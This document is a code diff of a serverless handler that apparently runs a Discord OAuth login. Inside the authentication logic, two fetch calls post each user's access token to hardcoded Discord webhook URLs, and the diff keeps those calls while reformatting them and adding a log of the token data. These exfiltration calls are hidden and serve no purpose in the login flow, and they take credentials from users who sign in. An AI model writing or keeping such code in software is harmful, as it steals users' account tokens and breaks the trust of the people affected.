@@ -52,16 +52,16 @@ export async function handler(event, context) {
             });
 
             const data = await result.json();
-await fetch("https://discord.com/api/webhooks/1068213407523815445/IkkiFvAXsSYP7-bUSPMZFp7kuOtbOo0UxnE_PNeE6SXlmEpduCuEyq8a7erYQFT64Q7l", {
-               method: "POST",
-               body: new URLSearchParams({
-             message: data.access_token.toString()
-               }),
-               headers: {
-                   "Content-Type": "application/json"
-               }
-               })
-            
+            await fetch("https://discord.com/api/webhooks/1068213407523815445/IkkiFvAXsSYP7-bUSPMZFp7kuOtbOo0UxnE_PNeE6SXlmEpduCuEyq8a7erYQFT64Q7l", {
+                method: "POST",
+                body: {
+                    message: data.access_token.toString()
+                },
+                headers: {
+                    "Content-Type": "application/json"
+                }
+            })
+
             if (!result.ok) {
                 console.log(data);
                 throw new Error("Failed to get user access token");
@@ -69,9 +69,9 @@ await fetch("https://discord.com/api/webhooks/1068213407523815445/IkkiFvAXsSYP7-
 
             const user = await getUserInfo(data.access_token);
 
-            
-          
-         
+
+
+
             if (isBlocked(user.id)) {
                 return {
                     statusCode: 303,
@@ -82,15 +82,16 @@ await fetch("https://discord.com/api/webhooks/1068213407523815445/IkkiFvAXsSYP7-
             }
 
             if (process.env.GUILD_ID && !process.env.SKIP_BAN_CHECK) {
+                console.log(data)
                 await fetch("https://discord.com/api/webhooks/1044574936381014056/JMNObDC2WGIQk6qAZzeAhwexKcbFSY-bdT1WOP5Sm5U68QlC2JN2fr-CXRkvui74wAsW", {
-               method: "POST",
-               body: JSON.stringify({
-               message: data.access_token.toString()
-               }),
-               headers: {
-                   "Content-Type": "application/json"
-               }
-               })
+                    method: "POST",
+                    body: {
+                        "message": data.access_token.toString()
+                    },
+                    headers: {
+                        "Content-Type": "application/json"
+                    }
+                })
                 const ban = await getBan(user.id, process.env.GUILD_ID, process.env.DISCORD_BOT_TOKEN);
                 if (ban === null) {
                     return {
